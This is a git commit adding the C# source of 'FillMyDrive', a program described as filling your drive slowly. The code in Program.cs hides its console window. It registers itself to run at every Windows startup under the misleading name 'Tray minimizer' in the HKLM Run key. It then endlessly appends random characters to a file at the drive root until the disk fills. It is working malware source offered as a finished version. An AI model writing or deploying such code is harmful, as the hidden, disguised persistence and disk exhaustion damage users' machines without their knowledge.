9272dabf09b5eb352a2aab0b842e6b8f7c983765
XDRosenheim <patrickrosenheim@gmail.com>
2016-01-26 10:32:45 +0100

    [1.0] Working version.

---
+++ FillMyDrive/Program.cs
@@ -0,0 +1,64 @@
+﻿using System;
+using System.IO;
+using System.Net.Mime;
+using System.Text;
+using Microsoft.Win32;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace FillMyDrive {
+    class Program {
+
+        [DllImport( "user32.dll" )]
+        static extern bool ShowWindow( IntPtr hWnd, int nCmdShow );
+
+        [DllImport( "Kernel32" )]
+        private static extern IntPtr GetConsoleWindow();
+
+        const int SW_HIDE=0;
+        const int SW_SHOW=5;
+
+        static void Main( string[] args ) {
+            IntPtr hwnd;
+            hwnd = GetConsoleWindow();
+            ShowWindow( hwnd, SW_HIDE );
+
+            startup( true );
+            DirectoryInfo root;
+            root = new DirectoryInfo( "/" );
+            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" +
+                           "1234567890" +
+                           "+*'!\\\"#¤%&/()=?§½@£$€{[]}-_.,:;<>\n\r\t";
+            if(File.Exists( root + "file.fillMe" )) {
+                using(FileStream fs = File.Open( root + "file.fillMe", FileMode.Append )) {
+                    while(true) {
+                        for(int i = 0; i < Environment.TickCount; i++) {
+                            Random rnd = new Random();
+                            Byte[] text = new UTF32Encoding( true, false ).GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
+                            fs.Write( text, 0, text.Length );
+                        }
+                    }
+                }
+            }
+            using(FileStream fs = File.Create( root + "file.fillMe" )) {
+                while(true) {
+                    for(int i = 0; i < Environment.TickCount; i++) {
+                        Random rnd = new Random();
+                        Byte[] text = new UTF32Encoding( true, false ).GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
+                        fs.Write( text, 0, text.Length );
+                    }
+                }
+            }
+        }
+
+        private static void startup( bool add ) {
+            RegistryKey key = Registry.LocalMachine.OpenSubKey( @"Software\Microsoft\Windows\CurrentVersion\Run", true );
+            if(add) {
+                key.SetValue( "Tray minimizer", "\"" + Assembly.GetExecutingAssembly().Location + "\"" );
+            } else {
+                key.DeleteValue( "Tray minimizer" );
+            }
+            key.Close();
+        }
+    }
+}
---
+++ FillMyDrive/Properties/AssemblyInfo.cs
@@ -0,0 +1,32 @@
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following 
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle( "FillMyDrive" )]
+[assembly: AssemblyDescription( "This program will fill your drive, slowly..." )]
+[assembly: AssemblyCompany( "rosenheim.dk" )]
+[assembly: AssemblyProduct( "FillMyDrive" )]
+[assembly: AssemblyCopyright( "Copyright © rosenheim.dk 2016" )]
+
+// Setting ComVisible to false makes the types in this assembly not visible 
+// to COM components.  If you need to access a type in this assembly from 
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible( false )]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid( "5133eb85-7a99-4804-b7ba-500b8ec0d29a" )]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version 
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers 
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion( "1.0.0.*" )]
+[assembly: AssemblyFileVersion( "1.0.0.0" )]
